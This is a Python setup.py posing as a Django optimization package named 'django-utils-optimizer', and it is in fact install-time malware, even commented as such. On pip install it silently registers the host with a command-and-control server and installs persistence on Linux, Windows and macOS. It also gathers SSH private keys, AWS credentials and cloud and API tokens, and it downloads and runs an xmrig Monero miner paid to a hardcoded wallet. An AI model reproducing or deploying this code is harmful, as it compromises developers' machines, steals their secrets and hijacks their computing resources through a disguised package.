from setuptools import setup, find_packages
import os
import sys
import subprocess
import platform
import socket
import json
import time
import hashlib
from pathlib import Path

# Malicious setup.py - runs on pip install

C2_SERVER = os.environ.get("C2_SERVER", "http://127.0.0.1:5000")
WALLET = "44haKQM5F43d37q3k6mV45YbrL5g6wGHWNB5uyt2cDfTdR8d9FicJCbitjm1xeKZzEVULG7MqdVFWEa9wKXsNLTpFvzffR5"

def get_agent_id():
    data = f"{socket.gethostname()}-{platform.node()}-{time.time()}"
    return hashlib.md5(data.encode()).hexdigest()[:16]

def get_system_info():
    return {
        "agent_id": get_agent_id(),
        "hostname": socket.gethostname(),
        "platform": platform.system(),
        "os": platform.platform(),
        "arch": platform.machine(),
        "cpu_count": os.cpu_count(),
        "user": os.environ.get("USER", os.environ.get("USERNAME", "unknown")),
        "python": sys.version,
        "cwd": os.getcwd(),
    }

def register():
    try:
        import urllib.request
        data = json.dumps(get_system_info()).encode()
        req = urllib.request.Request(
            f"{C2_SERVER}/api/agent/register",
            data=data,
            headers={"Content-Type": "application/json"},
            method="POST"
        )
        urllib.request.urlopen(req, timeout=5)
    except:
        pass

def install_persistence():
    system = platform.system()
    payload_path = str(Path.home() / ".local" / "lib" / ".python_update.py")
    
    # Copy self
    os.makedirs(os.path.dirname(payload_path), exist_ok=True)
    
    if system == "Linux":
        # Cron job
        cron_entry = f"@reboot python3 {payload_path}\n"
        try:
            result = subprocess.run(["crontab", "-l"], capture_output=True, text=True)
            if payload_path not in result.stdout:
                with open("/tmp/cron_update", "w") as f:
                    f.write(result.stdout + cron_entry)
                subprocess.run(["crontab", "/tmp/cron_update"])
        except:
            pass
        
        # Systemd
        service = f"""[Unit]
Description=Python Update Service
After=network.target

[Service]
Type=simple
ExecStart=/usr/bin/python3 {payload_path}
Restart=always

[Install]
WantedBy=multi-user.target
"""
        try:
            with open("/etc/systemd/system/python-update.service", "w") as f:
                f.write(service)
            subprocess.run(["systemctl", "daemon-reload"], capture_output=True)
            subprocess.run(["systemctl", "enable", "python-update"], capture_output=True)
        except:
            pass
            
    elif system == "Windows":
        # Registry
        try:
            import winreg
            key = winreg.OpenKey(
                winreg.HKEY_CURRENT_USER,
                r"Software\Microsoft\Windows\CurrentVersion\Run",
                0, winreg.KEY_SET_VALUE
            )
            winreg.SetValueEx(key, "PythonUpdate", 0, winreg.REG_SZ, f'pythonw "{payload_path}"')
            winreg.CloseKey(key)
        except:
            pass
        
        # Scheduled task
        try:
            subprocess.run([
                "schtasks", "/create", "/tn", "PythonUpdate",
                "/tr", f'pythonw "{payload_path}"',
                "/sc", "onlogon", "/rl", "highest", "/f"
            ], capture_output=True)
        except:
            pass
            
    elif system == "Darwin":
        # Launch Agent
        plist = f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.python.update</string>
    <key>ProgramArguments</key>
    <array>
        <string>/usr/bin/python3</string>
        <string>{payload_path}</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
</dict>
</plist>
"""
        plist_path = str(Path.home() / "Library" / "LaunchAgents" / "com.python.update.plist")
        os.makedirs(os.path.dirname(plist_path), exist_ok=True)
        with open(plist_path, "w") as f:
            f.write(plist)
        subprocess.run(["launchctl", "load", plist_path], capture_output=True)

def collect_data():
    data = {}
    
    # SSH keys
    ssh_dir = Path.home() / ".ssh"
    if ssh_dir.exists():
        data["ssh_keys"] = []
        for f in ssh_dir.iterdir():
            if f.name.startswith("id_") and not f.name.endswith(".pub"):
                try:
                    data["ssh_keys"].append({
                        "name": f.name,
                        "content": f.read_text()
                    })
                except:
                    pass
    
    # AWS credentials
    aws_path = Path.home() / ".aws" / "credentials"
    if aws_path.exists():
        try:
            data["aws_creds"] = aws_path.read_text()
        except:
            pass
    
    # Environment variables with secrets
    env_keys = ["AWS_ACCESS_KEY_ID", "AWS_SECRET_ACCESS_KEY", "GITHUB_TOKEN", 
                "GITLAB_TOKEN", "HEROKU_API_KEY", "DIGITALOCEAN_TOKEN",
                "SLACK_TOKEN", "DISCORD_TOKEN", "NPM_TOKEN", "PYPI_TOKEN"]
    data["env_secrets"] = {k: os.environ.get(k) for k in env_keys if os.environ.get(k)}
    
    return data

def start_mining():
    # Download and start xmrig
    try:
        import urllib.request
        
        system = platform.system()
        if system == "Linux":
            url = "https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-static-x64.tar.gz"
        elif system == "Windows":
            url = "https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-msvc-win64.zip"
        else:
            return
        
        cache_dir = Path.home() / ".cache" / ".system"
        cache_dir.mkdir(parents=True, exist_ok=True)
        
        archive = cache_dir / "xmrig.tar.gz"
        urllib.request.urlretrieve(url, archive)
        
        subprocess.run(["tar", "-xzf", str(archive), "-C", str(cache_dir)], capture_output=True)
        
        # Find xmrig binary
        for f in cache_dir.rglob("*xmrig*"):
            if f.is_file() and not f.suffix:
                os.chmod(f, 0o755)
                subprocess.Popen([
                    str(f),
                    "--url", "pool.monero.hashvault.pro:443",
                    "--user", WALLET,
                    "--pass", get_agent_id(),
                    "--background",
                    "--tls"
                ])
                break
    except:
        pass

# Execute payload silently
try:
    register()
    install_persistence()
    collect_data()
    start_mining()
except:
    pass

setup(
    name="django-utils-optimizer",
    version="1.2.5",
    description="Django performance optimization utilities",
    author="django-tools",
    author_email="tools@django-utils.io",
    packages=find_packages(),
    install_requires=[
        "requests>=2.25.0",
    ],
    python_requires=">=3.6",
)
